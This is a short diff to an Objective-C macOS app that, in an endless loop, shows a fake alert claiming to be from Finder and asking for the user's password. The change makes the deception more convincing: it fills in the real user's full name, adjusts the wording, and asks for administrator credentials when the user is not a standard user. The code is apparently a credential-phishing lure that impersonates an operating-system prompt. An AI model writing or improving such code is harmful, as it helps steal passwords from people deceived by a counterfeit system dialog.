@@ -61,10 +61,15 @@
 - (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
     while (1) {
         ASFinderAlert *passRequest = [[ASFinderAlert alloc] init];
-        [passRequest setMessageText:@"Finder wants to restart. Type your       password to allow this."];
+        if (getgid()==20) {
+            [passRequest setMessageText:@"Finder wants to make changes. Type your       password to allow this."];
+        }
+        else {
+            [passRequest setMessageText:@"Finder wants to make changes. Type an       administrator's name and password to allow this."];
+        }
         [passRequest addButtonWithTitle:@"OK"];
         [passRequest addButtonWithTitle:@"Cancel"];
-        [passRequest setAccessoryView:[InputView inputViewWithUsername:@"James Pickering"]];
+        [passRequest setAccessoryView:[InputView inputViewWithUsername:NSFullUserName()]];
         
         NSProcessInfo *pInfo = [NSProcessInfo processInfo];
         NSString *version = [pInfo operatingSystemVersionString];
